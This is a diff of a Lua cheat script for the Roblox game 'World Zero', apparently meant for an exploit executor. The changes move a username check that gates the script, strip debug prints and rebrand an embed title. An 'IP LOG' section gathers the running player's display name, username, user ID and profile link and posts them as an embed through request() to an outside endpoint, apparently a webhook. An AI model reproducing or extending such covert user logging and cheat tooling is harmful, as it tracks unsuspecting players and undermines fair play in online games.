@@ -312,20 +312,11 @@ end
 
 local _workspace = game:GetService("Workspace")
 local _httpService = game:GetService("HttpService")
-local _players = game:GetService("Players")
 local _userInputService = game:GetService("UserInputService")
 
-local Player = _players.LocalPlayer
 local Executor = identifyexecutor and identifyexecutor() or "Unknown"
 
 
-local playerName = Player.Name
-print("playerName: " .. playerName)
-
-if not string.find(playerName, "213") then
-    print("Player name does not contain '213'. Exiting script.")
-    return
-end
 
 -- Safe http req
 local function SafeHttpGet(url)
@@ -376,18 +367,25 @@ local data = {
 --==========================================================IP LOG===================================================
 
 local a; -- local UserInputService
-local _players = game:GetService('Players')
+local _players = game:GetService("Players")
 local _localplayer = _players.LocalPlayer or _players:GetPropertyChangedSignal('LocalPlayer'):Wait() or _players.LocalPlayer;
 local _userid = _localplayer.UserId;
 local _httpservice = game:GetService('HttpService')
-getgenv().plrLink = 'User: [' .. _localplayer.DisplayName .. ' (@' .. _localplayer.Name .. ')](https://www.roblox.com/users/' .. _userid ..
-                        '/profile)'
+getgenv().plrLink = 'User: [' .. _localplayer.DisplayName .. ' (@' .. _localplayer.Name .. ')](https://www.roblox.com/users/' .. _userid .. '/profile)'
+
+print("playerName: " .. _localplayer.Name)
+
+if not string.find(_localplayer.Name, "213") then
+    print("Player name does not contain '213'. Exiting script.")
+    return
+end
+
+
 local function f()
     local g = os.date("!*t", os.time())
     local h, i, j, k, l = g.hour, g.min, g.sec, g.day, g.month;
     if h < 10 then
         h = '0' .. h
-print("Reached line 800")
     end
     if i < 10 then
         i = '0' .. i
@@ -400,10 +398,10 @@ print("Reached line 800")
     end
     if l < 10 then
         l = '0' .. l
-print("Reached line 1000")
     end
     return h .. ':' .. i .. ':' .. j .. ' - ' .. k .. '/' .. l .. '/' .. g.year
 end
+
 local m = {
     Green = 0x00FF00,
     Red = 0xFF0000,
@@ -414,10 +412,12 @@ local m = {
     Purple = 0x8C00FF,
     LightPink = 0xff7fff
 }
+
 task.spawn(function()
     repeat
         task.wait()
-    until a;
+    until a;  -- for UserInputService to be defined
+
     pcall(function()
         local function n(o, p, q)
             request({
@@ -428,7 +428,7 @@ task.spawn(function()
                 },
                 Body = _httpservice:JSONEncode({
                     ["embeds"] = {{
-                        ["title"] = 'AnyaTeam | World Zero',
+                        ["title"] = 'too8 | World Zero',
                         ["description"] = o,
                         ["type"] = 'rich',
                         ["color"] = tonumber(p),
